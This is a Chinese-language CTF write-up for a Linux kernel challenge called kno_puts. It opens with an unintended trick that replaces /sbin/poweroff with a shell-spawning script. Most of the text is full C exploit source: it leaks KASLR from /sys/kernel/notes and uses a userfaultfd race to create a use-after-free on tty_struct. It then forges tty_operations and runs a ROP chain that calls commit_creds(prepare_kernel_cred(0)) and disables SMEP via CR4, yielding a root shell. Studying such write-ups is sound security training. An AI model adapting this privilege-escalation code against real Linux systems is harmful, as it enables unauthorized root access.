---
date: 2024-09-29 09:15
challenge: kno_puts
tags:
  - kernel
  - userfaultfd race
---

先放出来的题有非预期解，删 poweroff：

```bash
cd sbin

rm poweroff

cat << EOF > ./poweroff ; chmod +x ./poweroff
#!/bin/sh
/bin/sh
EOF

exit
```

根据上一题 flag，应该是要 kaslr 绕过，想起来可以直接读 `/sys/kernel/notes`

5.4.272 的内核，注意 init 脚本，可以用 userfaultfd 卡住 write，应该可以实现 UAF 的效果，后面大小 0x2E0 应该正好也能打 tty：

```c
// author: @eastXueLian
// usage : eval $buildPhase
// You can refer to my nix configuration for detailed information.

#include "libLian.h"
#include <stdint.h>
#define OFFSET 0x84
#define NUM_BYTES 8
#define LEAK_FILE "/sys/kernel/notes"

extern size_t user_cs, user_ss, user_rflags, user_sp;

int fd, tty_fd;
size_t kaslr_offset;
size_t buf[8];
size_t uaf_chunk_addr;
size_t fake_op_addr;
size_t mov_rsp_rax_ret = 0xffffffff81c014aa;
size_t push_rsi_pop_rsp = 0xffffffff81599a34;
size_t pop_rax_ret = 0xffffffff8101040e;
size_t pop_rdi_ret = 0xffffffff81003e98;
size_t prepare_kernel_cred = 0xffffffff81098140;
size_t commit_creds = 0xffffffff81097d00;
size_t mov_cr4_rdi_ret = 0xffffffff8103cd62;
/* 0xffffffff81025c18 : mov rdi, rax ; mov eax, ebx ; pop rbx ; or rax, rdi
 * ; ret */
size_t set_rdi_and_ret = 0xffffffff81025c18;
size_t pop_rbx_ret = 0xffffffff810035a6;
size_t swapgs_ret = 0xffffffff8105c8f0;
size_t iretq = 0xffffffff8109ca26;

void segfault_handler(int sig) {
    success("Returning root shell:");
    get_shell();
    exit(0);
}

static void *fault_handler_thread(void *arg) {
    static int fault_cnt = 0;
    char *page = malloc(0x1000);
    static struct uffd_msg msg;
    struct uffdio_copy copy;
    struct pollfd pollfd;
    long uffd;
    bind_cpu(0);

    uffd = (long)arg;
    pollfd.fd = uffd;
    pollfd.events = POLLIN;

    while (poll(&pollfd, 1, -1) > 0) {
        read(uffd, &msg, sizeof(msg));
        log(fault_cnt);

        switch (fault_cnt++) {
        case 0: {
            ((size_t *)page)[0] = 0x100005401;
            ((size_t *)page)[1] = 0;
            ((size_t *)page)[2] = uaf_chunk_addr + 0x70;

            buf[5] = 0; // v4
            ioctl(fd, 0xfff1, buf); // call kfree

            tty_fd = open("/dev/ptmx", O_RDWR);
            success("UAF tty_struct.");

            info("Alloc another chunk to set tty_operations.");
            buf[5] = (size_t)&fake_op_addr; // v4
            ioctl(fd, 0xfff0, buf);
            log(fake_op_addr);

            ((size_t *)page)[3] = fake_op_addr;

            size_t fake_op_buf[0x2e0 / 8];

            for (int i = 0; i < 0x10; i++)
                fake_op_buf[i] = push_rsi_pop_rsp + kaslr_offset;
            fake_op_buf[0] = pop_rax_ret + kaslr_offset;
            fake_op_buf[1] = fake_op_addr + 0x100;

            write(fd, (char *)fake_op_buf, 0x2e0);

            break;
        }
        }

        copy.src = (size_t)page;
        copy.dst = (size_t)msg.arg.pagefault.address & ~(0x1000 - 1);
        copy.len = 0x1000;
        copy.mode = 0;
        copy.copy = 0;
        ioctl(uffd, UFFDIO_COPY, &copy);
    }
    return NULL;
}

void register_userfaultfd(void *addr, unsigned long len,
                          void *(*handler)(void *)) {
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    pthread_t monitor_thread;
    long uffd;

    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    ioctl(uffd, UFFDIO_API, &uffdio_api);

    uffdio_register.range.start = (unsigned long)addr;
    uffdio_register.range.len = len;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    ioctl(uffd, UFFDIO_REGISTER, &uffdio_register);

    pthread_create(&monitor_thread, NULL, handler, (void *)uffd);
}

void leak_from_kerner_notes() {
    FILE *file = fopen(LEAK_FILE, "rb");
    if (file == NULL) {
        errExit("Error opening file");
    }
    if (fseek(file, OFFSET, SEEK_SET) != 0) {
        errExit("Error seeking in file");
    }
    uint8_t buffer[NUM_BYTES];
    size_t bytesRead = fread(buffer, 1, NUM_BYTES, file);
    if (bytesRead != NUM_BYTES) {
        errExit("readfile failed");
    }
    fclose(file);
    size_t value = 0;
    for (int i = 0; i < NUM_BYTES; i++) {
        value |= ((size_t)buffer[i] << (8 * i));
    }
    kaslr_offset = value - 0x1949480 - 0xffffffff81097d00;
    log(kaslr_offset);
}

int main() {
    save_status();
    signal(SIGSEGV, segfault_handler);
    bind_cpu(0);

    info("STEP1 - Leak KASLR Offset from `/sys/kernel/notes`.");
    leak_from_kerner_notes();

    info("STEP2 - Bypass Password with Stack Argument Overflow.");
    fd = open("/dev/ksctf", 2);
    buf[0] = 0xdea1bee1caf1bad1;
    buf[1] = 0xdea2bee2caf2bad2;
    buf[2] = 0xdea3bee3caf3bad3;
    buf[3] = 0xdea4bee4caf4bad4;
    buf[4] = 0xdea5bee5caf50001;      // bypass password
    buf[5] = (size_t)&uaf_chunk_addr; // v4

    info("STEP3 - Construct UAF with userfaultfd && Race.");
    ioctl(fd, 0xfff0, buf);
    log(uaf_chunk_addr);
    char *uffd_page =
        mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    register_userfaultfd(uffd_page, 0x1000, fault_handler_thread);

    /* write(fd, uffd_page, 1); */
    write(fd, uffd_page, 0x20);
    info("Should goto fault_handler_thread here.");

    /* info("Debug uaf_chunk here."); */
    /* getchar(); */

    info("STEP4 - Construct normal ROP.");
    size_t rop[0x100 / 8];
    int i = 0;
    rop[i++] = pop_rdi_ret + kaslr_offset;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred + kaslr_offset;
    rop[i++] = pop_rbx_ret + kaslr_offset;
    rop[i++] = 0;
    rop[i++] = set_rdi_and_ret + kaslr_offset;
    rop[i++] = 0;
    rop[i++] = commit_creds + kaslr_offset;
    rop[i++] = pop_rdi_ret + kaslr_offset;
    rop[i++] = 0x6f0;
    rop[i++] = mov_cr4_rdi_ret + kaslr_offset;
    rop[i++] = swapgs_ret + kaslr_offset;
    rop[i++] = iretq + kaslr_offset;
    rop[i++] = (size_t)get_shell;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;

    write(tty_fd, rop, 0x100);

    return 0;
}
```
